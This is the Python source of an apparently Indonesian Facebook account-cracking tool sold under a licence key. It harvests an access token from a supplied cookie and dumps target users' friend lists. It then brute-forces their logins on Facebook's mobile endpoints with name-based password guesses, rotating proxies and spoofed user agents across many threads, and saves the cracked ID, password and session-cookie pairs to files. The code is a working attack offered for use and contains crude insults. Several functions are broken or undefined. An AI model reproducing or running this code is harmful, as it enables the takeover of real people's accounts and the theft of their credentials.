# BAGIAN MENU #
import os,re,sys,time,json,random,datetime,requests 
import os, sys, re, time, requests, calendar, random, bs4, subprocess, uuid, json, threading,platform,string
import urllib3,rich,base64
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor as tred
from datetime import datetime
from platform import platform
# UA #
ugen2=[]
ugen=[]
proxxy=[]
dump=[]
cokbrut=[]
usragent = []
usrgent2 = []
princp=[]
kontol = []
ses=requests.Session()

###----------[ GET PROXY ]----------###
try:
	proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('socksku.txt','w').write(proxylist)
except Exception as e:
	baz_anim(f'gagal ster :(')
proxsi=open('socksku.txt','r').read().splitlines()

###----------[ USER AGENT 1 ]----------###
for agenku in range(10000):
	a='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c='Mi A3 Build/QKQ1.190910.002; wv)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36 OPR/52.2.2254.54723'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	usragent.append(uakuh)

	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6.0.1','7.1.1','8.1.0'])
	c='BASARI-ID Build/MMB29K)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36 OPT/1.7.21'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	usragent.append(uakuh)


###----------[ USER AGENT 2 ]----------###
for agenkuw in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8.1.0','9','10','11','12'])
	c='CPH2109'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Safari/537.36'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	usrgent2.append(uakuh)
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8.1.0','9','10','11','12'])
	c='CPH2089'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Safari/537.36'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	usrgent2.append(uakuh)

def loading():
    animation = ["[\x1b[1;91mâ– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡]","[\x1b[1;92mâ– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;93mâ– â– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;94mâ– â– â– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;95mâ– â– â– â– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;96mâ– â– â– â– â– â– \x1b[0mâ–¡â–¡â–¡â–¡]", "[\x1b[1;97mâ– â– â– â– â– â– â– \x1b[0mâ–¡â–¡â–¡]", "[\x1b[1;98mâ– â– â– â– â– â– â– â– \x1b[0mâ–¡â–¡]", "[\x1b[1;99mâ– â– â– â– â– â– â– â– â– \x1b[0mâ–¡]", "[\x1b[1;910mâ– â– â– â– â– â– â– â– â– â– \x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r {N}[{H}â€¢{N}] {H}Loading...{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
# WARNA #
c = '\33[1;35m'
FR = '\033[0;31m'  # Red
FG = '\033[0;32m'  # Green
FY = '\033[0;33m'  # Yellow
FC = '\033[0;36m'  # Cyan
q = '\033[45m'  # Reset Color
d = '\x1b[1;97m'
Fran = random.choice([f'{FR}',f'{FG}',f'{FY}',f'{FC}'])
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAUU
K = '\x1b[1;93m' # KUNING
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
O = '\x1b[1;96m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[45m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([p,m,k])
# PEPEK #
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
id = []
id2 = []
loop = 0
ok,cp = 0,0
xnxnxn = []
method = []
ses=requests.Session()
binapps = []
nxnxnx = []
uid = []
qqqqq,qqqqqqq=[],[]
u,akun,uid,id,id2,metode,loop,ok,cp = [],[],[],[],[],[],0,0,0
ugent,apk = [],[]
#PLER
def PLER(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	masuk()
#BULAN#
tanggal = datetime.now().strftime("%d-%b-%Y")
okc = "OK-%s.txt"%(tanggal)
cpc = "OK-%s.txt"%(tanggal)
# LOGIN
#--------------------[ BAGIAN-MASUK ]--------------#
def masuk():
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
        nxnxnx.append(token)
        try:
            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+nxnxnx[0], cookies={'cookie':cok})
            kuda()
        except KeyError:
            masukatuh()
        except requests.exceptions.ConnectionError:
            print('Check ur connetion!')
            exit()
    except IOError:
        masukatuh()
        os.system('rm -rf .cok.txt && rm -rf .token.txt')
        exit()
def masukatuh():
    try:
        os.system('clear')
        cek()
        print('√-------------------------------------------------------√')
        cookie = input(f'• Ingfo kuki :{FG} ')
        cookies = {'cookie':cookie}
        url = 'https://www.facebook.com/adsmanager/manage/campaigns'
        req = ses.get(url,cookies=cookies)
        set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
        nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
        roq = ses.get(nek,cookies=cookies)
        tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
        open(".token.txt", "w").write(tok)
        open(".cok.txt", "w").write(cookie)
        print('\nLogin Berhasil , file tersimpan di .token.txt & .cok.txt')
        kuda()
    except Exception as e:
        os.system('rm -rf .cok.txt && rm -rf .token.txt')
        exit()
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
	
def kuda():
	try:
		licen = open(".lisen","r").read()
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('\033[0m╰─ Expired Cookies ')
		time.sleep(5)
		masuk()
	os.system('clear')
	cek()
	print('√---------------------------------------------------------√')
	print('[1] Crack Publik ')
	print('[2] Crack file ')
	print('[3] dump id file ')
	print('[4] cek hasil crack ')
	print (f'[5] ketik {H}K {P}untuk keluar ')
	print('√----------------------------------------√')
	ham = input('[•] pilih : ')
	if ham in ['1']:
		ko()
	if ham in ['2']:
		kencing()
	if ham in ['3']:
		kadal()
	if ham in ['4']:
		la()
	elif ham in ['k']:
		os.system('rm -rf .tok.txt')
		os.system('rm -rf .cok.txt')
		print('>> Sukses Logout+Hapus Kukis ')
		exit()
	else:
		print('>> Pilih Yang Bener Asu ')
		back()
def la():
	print('[×] ==============================[×]')
	print(f'[{P}01{x}] Hasil OK kamu ')
	print(f'[{P}02{x}] Hasil CP kamu ')
	print(f'[{P}03{x}] Kembali	')
	print('[×] ==============================[×]')
	kz = input(f'\n[{P}0?{x}] Select : ')
	if kz in ['2','02']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('>> File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('>> Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'[{M}-{x}] %s. %s {k}%s{x} akun'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'[{M}-{x}] %s. %s {k}%s{x} akun'%(cih,isi,(len(hem))))
			geeh = input(f'\n[{M}?{x}] Select : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{x}[{M}-{x}] ID Akun : {k}{cpkuni[0]}{x}\n[{M}-{x}] Password: {k}{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'{x}[{m} Click Enter{x} ]')
			back()
	elif kz in ['1','01']: 
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('>> File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('>> Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'[{M}+{x}] %s. %s {h}%s{x} akun'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'[{M}+{x}] %s. %s {h}%s{x} akun'%(cih,isi,(len(hem))))
			geeh = input(f'\n[{M}?{x}] Select : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{x}[{M}+{x}] ID Akun : {h}{cpkuni[0]}{x}\n[{M}+{x}] Password: {h}{cpkuni[1]}\n')
				nocp +=1
			print('')
			input(f'[{M}!{x}] Klik enter ')
			back()
	elif kz in ['3','03']:
		back()
	else:
		print('>> Pilih Yang Bener Kontol ')
		exit()

def kadal():
    system('clear')
    try:
          cokis = open('.cok.txt','r').read()
          token = open('.token.txt','r').read()
    except (FileNotFoundError,IOError):masuk()
    try:
          link = requests.Session().get('https://graph.facebook.com/me?access_token={}'.format(token), cookies = {'cookie':cokis}).json()
          nama,user = link['name'],link['id']
    except KeyError:masuk()
    except requests.exceptions.ConnectionError:exit(' [×] Tidak ada koneksi.')
    lonte()
    nama_file = input(' Nama File Harus Berformat .txt\n Contoh : Sixgod.txt\n [✓] Beri Nama File : ').replace(' ','_')
    user_target = input('[•] masukan id target : ')
    pemisahan_tengah = input('[•] pemisahan id dan sandi contoh -> | Atau <=> : ')
    dump_target(nama_file, user_target, pemisahan_tengah)

def dump_target(file, id, pisah):
    for kontol in id.split(','):
        try:
              for data in requests.get("https://graph.facebook.com/{}?fields=friends.limit(5000)&access_token={}".format(kontol,open('.token.txt','r').read()), cookies={"cookie":open('.cok.txt','r').read()}).json()['friends']['data']:
                  open(file,'a').write(data['id'] +pisah+ data['name'] +'\n')
        except KeyError:pass
    exit(f'\n  [✓] File Di Simpan Ke : {file}') 
	
def kencing():
	try:vin = os.listdir('/sdcard/H-DUMP')
	except FileNotFoundError:
		print('>> File Tidak Ditemukan ')
		time.sleep(2)
		back()
	if len(vin)==0:
		print('')
		cetak(nel('[white][[cyan]•[white]] Jika Ingin Menggunakan Fitur Ini Ikuti Syaratnya Dibawah Ini\n[[green]1[white]] Buatlah File Dump Id Terlebih dahulu\n[[green]2[white]] Setelah Jadi Masukkan Filenya Kedalam Folder[yellow] ALVINO-DUMP[white] di Penyimpanan Internal Kalian\n[[green]3[white]] Lalu Jalankan Ulang Scriptnya! Baru Pilih Fitur Nomor[yellow] 4 [white]ini '))
		kontol = input('\n>> Apakah Anda Faham ( Y/t ) ')
		if kontol in ['']:
			print('>> Pilih Yang Bener Asuhh ')
		elif kontol in ['y','Y']:
			print(f'\n[{h}√{x}] Alhamdulillah Anda Sungguh Pintarr ')
			time.sleep(3)
			back()
		elif kontol in ['t','T']:
			print(f'\n[{k}x{x}] Anda Sungguh Tolol ')
			time.sleep(3)
			exit()
		print('>> Anda Tidak Memiliki File Dump ')
		time.sleep(2)
		back()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/H-DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'>> %s. %s ({h} %s{x} idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print('>> %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
		geeh = input('\n>> Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			print(f'{k}>> Pilih Yang Bener Kontol {x}')
			time.sleep(3)
			back()
		try:lin = open('/sdcard/H-DUMP/'+geh,'r').read().splitlines()
		except:
			print('>> File Tidak Ditemukan, Coba Lagi Nanti ')
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
		momok()

def ko():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		os.system('clear')
		cek()
		print('√--------------------------------------------------------√')
		jum = int(input('[•] berapa id : '))
	except ValueError:
		exit()
	if jum<1 or jum>100:
		print('gagal dump id ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('[•] id '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+nxnxnx[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('sinyal lu jelek ')
			exit()
	try:
		momok()
	except requests.exceptions.ConnectionError:
		print('>> Sinyal Lo kek Kontol ')
		back()
	except (KeyError,IOError):
		print(f'{k} pertemanan tidak public {x}')
		time.sleep(3)
		back()
#momok
def momok():
	print('√----------------------------------------√')
	print(f'{x}[1] Akun Old ')
	print('[2] Akun New ')
	print('[3] Random ')
	hu = input('[•] pilih : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('>> Pilih Yang Bener Kontooll ')
		exit()
	pwplus=input('[•] katasandi manual ( Y/t ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		pwku=input('[•] katasandi : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	basreng()
	
#Basreng
def basreng():
	print('√----------------------------------------√')
	print (f'{P}[1] metode beta({M} recommended {P}) ')
	lala = input('[•] pilih : ')
	if lala in ['1']:
		kontol.append("Validate")
	print('√----------------------------------------√')
	print(f'[•] Total id : {P}'+str(len(id)))
	print(f'[•] {P}%s {x}'%(okc))
	print(f'[•] {P}%s {x}'%(cpc))
	print('√----------------------------------------√')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456') 
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'beta' in kontol:
					pool.submit(beta,idf,pwv)
				else:
					pool.submit(beta,idf,pwv)
	print('')
	print(f'[{P}[•]{P}]{h} OK : {h}%s '%(ok))
	print(f'{x}[{b}[•]{x}]{k} CP : {k}%s{x} '%(cp))
	print('')
	
def beta(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,b])
	sys.stdout.write(f"\r{P}BETA [{loop}{P}/{len(id)}{P}]•[{P}LIVE:{h}{ok}{P}/{P}CHEK:{k}{cp}{P}]{bo}{'{:.0%}'.format(loop/float(len(id)))}{P} "),
	sys.stdout.flush()
	ua = random.choice(usragent) 
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'm.beta.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.beta.facebook.com/?locale=id_ID&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.beta.facebook.com/login/save-device/?login_source=login","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.beta.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.beta.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.beta.facebook.com/?locale=id_ID&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.beta.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}{kk}[CHEK] {idf}|{pw}|{ua}{N}')     
				open('sdcard/hamz-CP/'+cpc,'a').write(idf+'|'+k+'\n')
				akun.append(idf+' • '+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{x}[LIVE] {hh}{idf}|{hh}{pw}|{kuki}{N}')
				open('sdcard/hamz-OK/'+okc,'a').write(idf+' • '+pw+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
def validate(idf,pwv):
	global loop,ok,cp
	bo = random.choice([P,P])
	sys.stdout.write(f"\r{P}VALIDATE [{loop}{P}/{len(id)}{P}]•[{P}LIVE:{h}{ok}{P}/{P}CHEK:{k}{cp}{P}]{bo}{'{:.0%}'.format(loop/float(len(id)))}{P} "),
	sys.stdout.flush()
	ua = 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'
	ua2 = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}{kk}[CHEK] {idf}|{pw}{N}')     
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+' • '+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{x}{H}[{P}LIVE{H}] {H}{idf}|{H}{pw} {N}')
				open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#LOGO##

def lonte():
	print(f"""
{P}
√-------------------------------------------------------√
---     __  ____   ___   ______ 
---    /  ]|    \ /   \ |      |
---   /  / |  D  )     ||      |  
---  /  /  |    /|  O  ||_|  |_|   
--- /   \_ |    \|     |  |  |  
--- \     ||  .  \     |  |  |    |• C M B F •|
---  \____||__|\_|\___/   |__| • Crot Multi Brute • 
--- -- ----- --- ----- ----- --- ---- ----  ---  --- [+]
√--------------------------------------------------------√""")


def api_key():
	os.system('clear')
	lonte()
	print("[1] Sudah Punya Api Key")
	print("[2] Beli License")
	i = input("[!] Pilih : ")
	if i in[""]:
		print("[-] Pilih yang bener");api_key()
	elif i in["1"]:
		punya()
	elif i in["2"]:
		beli()
	else:
		print("[-] Pilih yang bener");api_key()

def punya():
	try:
		os.system("clear")
		lonte()
		key = input("[•] Masukkan Key : ")
		mekk = requests.get(f"https://licensi.crot-brute.my.id/check.php?key={key}&dev={platform()}").json()
		open(".lisen","w").write(key)
		if mekk["status"] == "error":
			print(f"{mekk['msg'].replace('Anda telah menggunakan semua device yang tersisa, chat admin untuk menghapusnya', 'Akses login di tolak! dikarenakan anda sudah login di perangkat sebelumya.')}")
			exit()
		else:
			jon = mekk["join"]
			ex = mekk["expired"]
			aran = mekk["nama"]
			print(f"\n[+] Selamat Datang {aran} Di Tools Crack Crot")
			time.sleep(3)
			kuda()
	except KeyError:
		print("tidak valid key nya")

def cek():
	try:
		dat = open(".lisen","r").read()
		susu = requests.get(f"https://licensi.crot-brute.my.id/check.php?key={dat}&dev={platform()}").json()
		jon = susu["join"]
		ex = susu["expired"]
		aran = susu["nama"]
